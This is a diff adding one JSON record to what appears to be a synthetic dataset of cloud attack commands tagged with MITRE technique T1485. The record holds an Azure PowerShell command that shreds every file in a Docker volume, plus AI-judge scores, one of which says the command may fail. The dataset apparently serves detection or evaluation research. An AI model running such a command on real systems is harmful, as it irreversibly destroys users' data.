@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Apps' -Name 'LinVM-Containers' -CommandId 'RunShellScript' -ScriptString \"docker run --rm -v projectdata:/data alpine sh -lc 'find /data -type f -print0 | xargs -0 -I{} shred -n 3 -z -u \\\"{}\\\"'\"",
+  "explanation": "For a Docker volume named projectdata on a Linux VM, runs a container to securely overwrite and delete all files within the volume.",
+  "rationale_steps": [
+    "Mount the specific Docker volume into a temporary container.",
+    "Shred all files in the mounted path to irreversibly destroy data without affecting other volumes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-6e3aa0c6",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper nesting of quotes, valid parameter names for Invoke-AzVMRunCommand, and correct shell command construction within the ScriptString parameter.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using the 'shred' utility with secure deletion parameters (-n 3 overwrites 3 times, -z adds zeros, -u unlinks) to permanently destroy all files in a Docker volume, making them unrecoverable.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T01:46:09.994916Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct nesting of quotes for PowerShell and the inner shell script, including proper escaping for `shred` arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by using `Invoke-AzVMRunCommand` to execute a Docker container that employs `find`, `xargs`, and `shred -n 3 -z -u` to securely overwrite and delete all files within the specified Docker volume, directly aligning with the T1485 technique description.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:46:17.661707Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "The PowerShell -ScriptString uses a double-quoted string containing unescaped double quotes (\"{}\") which will terminate the string prematurely since backslash does not escape quotes in PowerShell, making the command likely to fail parsing.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually it securely overwrites and deletes files in the Docker volume (aligned with T1485), but using the bare alpine image likely lacks the shred utility and thus would not achieve the intended destruction without installing coreutils.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:47:03.221934Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
